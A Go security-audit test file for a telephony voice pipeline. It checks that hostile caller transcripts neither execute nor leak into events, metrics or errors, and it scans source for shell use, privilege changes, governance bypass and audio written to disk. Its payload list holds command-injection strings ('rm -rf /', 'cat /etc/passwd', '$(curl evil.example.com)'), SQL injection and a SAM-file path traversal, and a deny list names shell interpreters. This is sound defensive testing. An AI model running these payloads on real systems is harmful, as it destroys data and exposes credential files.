package voice

import (
	"context"
	"errors"
	"fmt"
	"go/ast"
	"go/parser"
	"go/token"
	"os"
	"reflect"
	"strings"
	"testing"
	"time"

	governance "github.com/callscreen/callscreen-platform/packages/go/governance"
	media "github.com/callscreen/callscreen-platform/packages/go/media"
	rt "github.com/callscreen/callscreen-platform/packages/go/runtime"
	speech "github.com/callscreen/callscreen-platform/packages/go/speech"
)

// ---------------------------------------------------------------------------
// Phase 11E security audit — the parts that are executable
// ---------------------------------------------------------------------------
//
// Much of this phase's security posture is already asserted elsewhere and is
// not repeated here: hostile argv and the environment allowlist in config_test
// and process_test, session isolation in concurrency_test, the governance
// gateway in governed_test, orphan processes in failure_test.
//
// What follows covers what those do not: hostile CONTENT travelling the whole
// pipeline, sensitive data reaching errors, and structural audits of the
// boundaries where a future change would most easily introduce a leak.

// hostilePayloads are the strings an attacker would try, plus the ones an
// ordinary caller produces that break naive escaping.
//
// The Devanagari entry is not decoration. This platform serves Indian
// telephony, multi-byte text is the normal case rather than the exotic one, and
// byte-oriented handling corrupts it in ways that look like a provider bug.
func hostilePayloads() []string {
	return []string{
		`; rm -rf /`,
		`| cat /etc/passwd`,
		`&& shutdown -h now`,
		"`whoami`",
		`$(curl evil.example.com)`,
		`" ; DROP TABLE calls; --`,
		`' OR '1'='1`,
		`C:\Windows\System32\cmd.exe /c del`,
		`..\..\..\Windows\System32\config\SAM`,
		`%SYSTEMROOT%\system32`,
		`नमस्ते, मेरा खाता बैलेंस क्या है`,
		`transfer ₹50,000 to account 4111 1111 1111 1111`,
		strings.Repeat("A", 4096),
		"line one\nline two\rline three",
		"\x00\x01\x02 control bytes",
	}
}

// ---------------------------------------------------------------------------
// A1. Hostile content through the whole pipeline
// ---------------------------------------------------------------------------

// TestSecurity_HostileTranscriptNeverEscapesAsCodeOrContent drives attacker
// text through recognition, planning, governance, generation and synthesis.
//
// Two properties at once: nothing executes, and nothing leaks. The transcript
// is what a caller SAID, so it must reach the planner and the synthesiser and
// nowhere else — not an event, not a metric label, not an error.
func TestSecurity_HostileTranscriptNeverEscapesAsCodeOrContent(t *testing.T) {
	t.Parallel()

	for i, payload := range hostilePayloads() {
		payload := payload
		t.Run(fmt.Sprintf("payload-%02d", i), func(t *testing.T) {
			t.Parallel()

			// A recogniser that "hears" the hostile string, and a generator
			// that echoes it back — the worst case, where attacker text passes
			// through every stage.
			h := newHarness(t, harnessOpts{
				segments: []speech.TranscriptSegment{
					{Segment: speech.SegmentID("s1"), Text: payload},
					{Segment: speech.SegmentID("s2"), Text: payload, IsFinal: true},
				},
				tokens: []string{payload + "?"},
			})

			if err := h.pipeline.Start(context.Background()); err != nil {
				t.Fatalf("Start: %v", err)
			}
			defer func() { _ = h.pipeline.Disconnect() }()

			h.feed(t, 4)
			select {
			case <-h.obs.turnDone:
			case <-time.After(30 * time.Second):
				t.Fatalf("hostile payload %q wedged the pipeline", truncateForLog(payload))
			}

			// --- nothing executed -------------------------------------------
			//
			// No adapter in this package builds a command line, so there is no
			// shell for the payload to reach. The observable proof is that the
			// turn completed normally and the session is intact.
			if h.fsm.Terminal() {
				t.Errorf("hostile input ended the session; state=%s", h.fsm.State())
			}
			if !h.fsm.State().Valid() {
				t.Errorf("hostile input produced the undeclared state %q", h.fsm.State())
			}

			// --- nothing leaked into events ---------------------------------
			assertNoPayloadInEvents(t, h.pub.Events(), payload)

			// --- nothing leaked into metric labels --------------------------
			assertNoPayloadInMetrics(t, h.metrics, payload)

			// --- nothing leaked into the recorded failure, if any ------------
			if err := h.pipeline.Err(); err != nil {
				assertNoPayload(t, "pipeline error", err.Error(), payload)
			}
		})
	}
}

// assertNoPayloadInEvents checks every published event for the payload.
func assertNoPayloadInEvents(t *testing.T, events []VoiceEvent, payload string) {
	t.Helper()

	for _, e := range events {
		// Every string-typed field, by reflection, so a field added later is
		// covered without this test being updated.
		v := reflect.ValueOf(e)
		for i := 0; i < v.NumField(); i++ {
			f := v.Field(i)
			if f.Kind() != reflect.String {
				continue
			}
			assertNoPayload(t,
				fmt.Sprintf("event %s field %s", e.Type, v.Type().Field(i).Name),
				f.String(), payload)
		}
	}
}

// assertNoPayloadInMetrics checks every metric label value.
func assertNoPayloadInMetrics(t *testing.T, m *VoiceMetrics, payload string) {
	t.Helper()

	for _, sample := range m.Snapshot() {
		for _, label := range sample.Labels {
			assertNoPayload(t, "metric "+sample.Name+" label", label, payload)
		}
	}
}

// assertNoPayload fails if a distinctive fragment of the payload appears.
//
// Fragments rather than the whole string: a truncated leak is still a leak, and
// comparing whole strings would miss it.
func assertNoPayload(t *testing.T, where, got, payload string) {
	t.Helper()

	for _, fragment := range distinctiveFragments(payload) {
		if strings.Contains(got, fragment) {
			t.Errorf("%s contains caller content: fragment %q leaked into %q",
				where, fragment, truncateForLog(got))
		}
	}
}

// distinctiveFragments returns pieces of a payload that should never appear.
func distinctiveFragments(payload string) []string {
	var out []string
	for _, f := range []string{
		"rm -rf", "etc/passwd", "shutdown", "whoami", "curl evil",
		"DROP TABLE", "OR '1'='1", "cmd.exe", "config\\SAM", "SYSTEMROOT",
		"नमस्ते", "4111 1111", "₹50,000", "control bytes",
	} {
		if strings.Contains(payload, f) {
			out = append(out, f)
		}
	}
	if len(out) == 0 && len(payload) >= 32 {
		out = append(out, payload[:32])
	}
	return out
}

func truncateForLog(s string) string {
	if len(s) <= 60 {
		return s
	}
	return s[:60] + "..."
}

// ---------------------------------------------------------------------------
// A2. Errors carry no caller or model content
// ---------------------------------------------------------------------------

// TestSecurity_ErrorsDoNotEmbedContent inspects the SOURCE for error
// constructions that interpolate a content-bearing variable.
//
// # Why source inspection rather than only behaviour
//
// A behavioural test only covers the error paths it manages to trigger. Most
// error paths in this package require a provider to misbehave in a specific
// way, and the one that leaked in this audit — an Ollama response truncated
// mid-object — was reachable only by scripting a partial write.
//
// Parsing the AST finds the construction regardless of whether anything can
// currently reach it, which is what makes it a defence against the NEXT error
// message rather than a record of this one.
func TestSecurity_ErrorsDoNotEmbedContent(t *testing.T) {
	t.Parallel()

	// Identifiers that hold caller or model content in this package.
	contentIdents := map[string]bool{
		"text": true, "Text": true, "transcript": true, "Transcript": true,
		"utterance": true, "Utterance": true, "content": true, "Content": true,
		"payload": true, "Payload": true, "line": true, "spoken": true,
	}

	// EVERY package in the module, not just this one. The leak this audit
	// actually found (SEC-1) lived in providers/ollama, and a scan limited to
	// the orchestration package would have missed it — which is precisely the
	// failure mode a structural test is supposed to prevent.
	roots := []string{".", "providers/process", "providers/whispercpp",
		"providers/whispercli", "providers/piper", "providers/ollama"}

	fset := token.NewFileSet()
	var pkgs []*ast.Package
	for _, root := range roots {
		parsed, err := parser.ParseDir(fset, root, func(fi os.FileInfo) bool {
			return !strings.HasSuffix(fi.Name(), "_test.go")
		}, 0)
		if err != nil {
			t.Fatalf("parsing %s: %v", root, err)
		}
		for _, pkg := range parsed {
			pkgs = append(pkgs, pkg)
		}
	}

	for _, pkg := range pkgs {
		for name, file := range pkg.Files {
			ast.Inspect(file, func(n ast.Node) bool {
				call, ok := n.(*ast.CallExpr)
				if !ok {
					return true
				}
				sel, ok := call.Fun.(*ast.SelectorExpr)
				if !ok {
					return true
				}
				pkgIdent, ok := sel.X.(*ast.Ident)
				if !ok || pkgIdent.Name != "fmt" ||
					(sel.Sel.Name != "Errorf" && sel.Sel.Name != "Sprintf") {
					return true
				}

				for _, arg := range call.Args[1:] {
					if leaksContent(arg, contentIdents) {
						pos := fset.Position(call.Pos())
						t.Errorf("%s:%d: an error interpolates a content-bearing "+
							"value (%s). Caller speech and model output are "+
							"SENSITIVE and errors are logged; report a length, a "+
							"code or a classification instead",
							name, pos.Line, render(arg))
					}
				}
				return true
			})
		}
	}
}

// leaksContent reports whether an argument expression is content.
//
// Deliberately narrow: a bare identifier or a direct field selector. Wrapping a
// value in len() or a classification helper is exactly the remediation, so
// those must not trip it.
func leaksContent(e ast.Expr, content map[string]bool) bool {
	switch v := e.(type) {
	case *ast.Ident:
		return content[v.Name]
	case *ast.SelectorExpr:
		return content[v.Sel.Name]
	}
	return false
}

func render(e ast.Expr) string {
	switch v := e.(type) {
	case *ast.Ident:
		return v.Name
	case *ast.SelectorExpr:
		if x, ok := v.X.(*ast.Ident); ok {
			return x.Name + "." + v.Sel.Name
		}
		return v.Sel.Name
	}
	return "expression"
}

// ---------------------------------------------------------------------------
// A3. No unbounded collection
// ---------------------------------------------------------------------------

// TestSecurity_EveryRetainedCollectionIsBounded audits the types that live for
// the length of a call.
//
// An unbounded slice on a per-session type is a memory-exhaustion vector that
// presents as a slow crash days later, and it is invisible in a short test.
// Each collection below is named with the bound that governs it.
func TestSecurity_EveryRetainedCollectionIsBounded(t *testing.T) {
	t.Parallel()

	// FSM history: bounded by MaxHistory.
	fsm, err := NewSessionFSM(FSMConfig{
		Session: SessionID("ses-sec"), MaxHistory: 4,
	})
	if err != nil {
		t.Fatal(err)
	}
	ctx := context.Background()
	if err := fsm.To(ctx, StateListening, ReasonOK); err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 500; i++ {
		_ = fsm.To(ctx, StateSpeakingDetected, ReasonOK)
		_ = fsm.To(ctx, StateListening, ReasonOK)
	}
	if got := len(fsm.History()); got > 4 {
		t.Errorf("FSM history holds %d entries against a bound of 4", got)
	}

	// Event publisher: bounded, and it must count what it dropped rather than
	// silently losing it.
	pub := NewBoundedRecordingEventPublisher(8)
	for i := 0; i < 1000; i++ {
		_ = pub.Publish(ctx, VoiceEvent{Type: EventStateChanged, Session: "ses-sec"})
	}
	if got := pub.Len(); got > 8 {
		t.Errorf("the publisher holds %d events against a bound of 8", got)
	}
	if pub.Dropped() == 0 {
		t.Error("the publisher dropped events without counting them")
	}

	// Registry descriptors: bounded by registrations, which are an operator
	// action at assembly rather than anything a caller drives. Recorded as an
	// explicit finding rather than an assertion.
	t.Log("registry descriptors grow only with operator registrations at " +
		"assembly time; no caller-driven path adds one")

	// Pipeline queues: fixed-capacity channels.
	reg := newRegistry(t, ModeDevelopment)
	if err := reg.RegisterSTT(
		&recordingSTT{id: "stt-sec", segments: defaultSegments()}, sttSpec()); err != nil {
		t.Fatal(err)
	}
	fsm2, err := NewSessionFSM(FSMConfig{Session: SessionID("ses-sec-2")})
	if err != nil {
		t.Fatal(err)
	}
	p, err := NewPipeline(PipelineConfig{
		Session: SessionID("ses-sec-2"), Language: langEN, Format: media.PCM16Mono16k(),
		Registry: reg, Intel: &scriptedIntel{}, Planner: &scriptedPlanner{},
		Governor:  benchGovernor{outcome: governance.OutcomeAllow},
		Generator: &scriptedGenerator{tokens: []string{"ok?"}},
		Output:    &countingSink{}, FSM: fsm2,
		MaxPendingFrames: 8, MaxPendingSegments: 8, MaxPendingAudio: 8,
		TurnTimeout: time.Second, Tier: rt.TierFast,
	})
	if err != nil {
		t.Fatal(err)
	}
	if got := cap(p.frames); got != 8 {
		t.Errorf("the inbound queue capacity is %d, want the configured 8", got)
	}
}

// TestSecurity_AnUnboundedQueueIsRefusedAtConfiguration proves the bound cannot
// be switched off.
func TestSecurity_AnUnboundedQueueIsRefusedAtConfiguration(t *testing.T) {
	t.Parallel()

	reg := newRegistry(t, ModeDevelopment)
	fsm, err := NewSessionFSM(FSMConfig{Session: SessionID("ses-sec-3")})
	if err != nil {
		t.Fatal(err)
	}

	base := PipelineConfig{
		Session: SessionID("ses-sec-3"), Language: langEN, Format: media.PCM16Mono16k(),
		Registry: reg, Intel: &scriptedIntel{}, Planner: &scriptedPlanner{},
		Governor:  benchGovernor{outcome: governance.OutcomeAllow},
		Generator: &scriptedGenerator{}, Output: &countingSink{}, FSM: fsm,
		MaxPendingFrames: 8, MaxPendingSegments: 8, MaxPendingAudio: 8,
		TurnTimeout: time.Second, Tier: rt.TierFast,
	}

	for _, field := range []string{"frames", "segments", "audio"} {
		cfg := base
		switch field {
		case "frames":
			cfg.MaxPendingFrames = 0
		case "segments":
			cfg.MaxPendingSegments = 0
		case "audio":
			cfg.MaxPendingAudio = 0
		}
		if _, err := NewPipeline(cfg); err == nil {
			t.Errorf("an unbounded %s queue was accepted", field)
		}
	}
}

// ---------------------------------------------------------------------------
// A4. Process privilege and shell avoidance
// ---------------------------------------------------------------------------

// TestSecurity_NoShellAndNoPrivilegeEscalation audits how children are started.
//
// Nothing in this phase may reach a shell, request elevation, or change the
// credentials a child runs as. The absence is checked structurally because it
// is an absence: there is no behaviour to observe, only code that must not
// exist.
func TestSecurity_NoShellAndNoPrivilegeEscalation(t *testing.T) {
	t.Parallel()

	forbidden := map[string]string{
		`exec.Command("sh"`:         "a shell interpreter",
		`exec.Command("bash"`:       "a shell interpreter",
		`exec.Command("cmd"`:        "a Windows command interpreter",
		`exec.Command("powershell"`: "a PowerShell interpreter",
		`"/bin/sh"`:                 "a shell path",
		`"cmd.exe"`:                 "a command interpreter path",
		"SysProcAttr":               "platform process attributes, which is where credentials or elevation would be set",
		"Credential{":               "process credentials",
		"syscall.Setuid":            "privilege change",
		"runas":                     "privilege elevation",
	}

	roots := []string{".", "providers/process", "providers/whispercpp",
		"providers/whispercli", "providers/piper", "providers/ollama"}

	for _, root := range roots {
		entries, err := os.ReadDir(root)
		if err != nil {
			t.Fatalf("reading %s: %v", root, err)
		}
		for _, e := range entries {
			if e.IsDir() || !strings.HasSuffix(e.Name(), ".go") ||
				strings.HasSuffix(e.Name(), "_test.go") {
				continue
			}
			path := root + "/" + e.Name()
			body, err := os.ReadFile(path)
			if err != nil {
				t.Fatalf("reading %s: %v", path, err)
			}
			for needle, why := range forbidden {
				if strings.Contains(string(body), needle) {
					t.Errorf("%s references %s (%s)", path, needle, why)
				}
			}
		}
	}
}

// ---------------------------------------------------------------------------
// A5. Governance cannot be bypassed, replayed or forged
// ---------------------------------------------------------------------------

// TestSecurity_GovernanceCannotBeBypassed re-asserts the three defences
// together, as an auditor would check them.
func TestSecurity_GovernanceCannotBeBypassed(t *testing.T) {
	t.Parallel()

	// 1. Authorization is unforgeable outside this package.
	typ := reflect.TypeOf(Authorization{})
	for i := 0; i < typ.NumField(); i++ {
		if typ.Field(i).PkgPath == "" {
			t.Errorf("Authorization.%s is exported: an outside package could mint "+
				"an authorisation governance never granted", typ.Field(i).Name)
		}
	}

	// 2. An unauthorised request is refused at the port.
	if err := (ToolRequest{Intent: testIntent()}).Validate(); !errors.Is(err, ErrUnauthorized) {
		t.Errorf("an unauthorised request passed validation: %v", err)
	}

	// 3. A denial reaches no invoker.
	inv := &recordingInvoker{forbidden: true, t: t}
	gw, err := NewToolGateway(GatewayConfig{
		Governor: benchGovernor{outcome: governance.OutcomeDeny},
		Invoker:  inv, Session: SessionID("ses-sec-gov"),
		Actor: governance.ActorID("auditor"),
	})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := gw.Invoke(context.Background(), TurnID("t"), testIntent()); err == nil {
		t.Fatal("a denied action reported success")
	}
	if got := inv.calls.Load(); got != 0 {
		t.Errorf("a denied action reached the invoker %d times", got)
	}

	// 4. An authorisation for one action does not authorise another.
	allowGW, err := NewToolGateway(GatewayConfig{
		Governor: benchGovernor{outcome: governance.OutcomeAllow},
		Invoker:  &capturingInvoker{}, Session: SessionID("ses-sec-gov"),
		Actor: governance.ActorID("auditor"),
	})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := allowGW.Invoke(context.Background(), TurnID("t"), testIntent()); err != nil {
		t.Fatal(err)
	}
	granted := allowGW.cfg.Invoker.(*capturingInvoker).req

	replay := ToolRequest{
		Auth:   granted.Auth,
		Intent: ToolIntent{Operation: "transfer", Resource: "account.balance"},
	}
	if err := replay.Validate(); !errors.Is(err, ErrUnauthorized) {
		t.Errorf("a lookup authorisation was replayed for a transfer: %v", err)
	}
}

// ---------------------------------------------------------------------------
// A6. No persistence of audio anywhere in this module
// ---------------------------------------------------------------------------

// TestSecurity_NoModuleWritesAudioToDisk audits every package in the module.
//
// The adapters that must write a temporary file — the Python whisper CLI takes
// a path, not a pipe — are named explicitly, so the exception is a decision on
// the record rather than a gap.
func TestSecurity_NoModuleWritesAudioToDisk(t *testing.T) {
	t.Parallel()

	// Packages permitted to create files, with the reason.
	permitted := map[string]string{
		"providers/whispercli": "the Python whisper CLI accepts a file path and " +
			"not a pipe; the file is written to a per-stream temporary directory " +
			"and removed by stream.cleanup, asserted by " +
			"TestAdapter_RemovesBufferedAudioOnClose",
	}

	roots := []string{".", "providers/process", "providers/whispercpp",
		"providers/whispercli", "providers/piper", "providers/ollama"}

	writers := []string{"os.Create", "os.WriteFile", "os.OpenFile", "ioutil.WriteFile"}

	for _, root := range roots {
		entries, err := os.ReadDir(root)
		if err != nil {
			t.Fatalf("reading %s: %v", root, err)
		}
		for _, e := range entries {
			if e.IsDir() || !strings.HasSuffix(e.Name(), ".go") ||
				strings.HasSuffix(e.Name(), "_test.go") {
				continue
			}
			body, err := os.ReadFile(root + "/" + e.Name())
			if err != nil {
				t.Fatalf("reading: %v", err)
			}
			for _, w := range writers {
				if !strings.Contains(string(body), w) {
					continue
				}
				if why, ok := permitted[root]; ok {
					t.Logf("%s/%s uses %s — permitted: %s", root, e.Name(), w, why)
					continue
				}
				t.Errorf("%s/%s uses %s; this module persists nothing, and audio "+
					"least of all", root, e.Name(), w)
			}
		}
	}
}
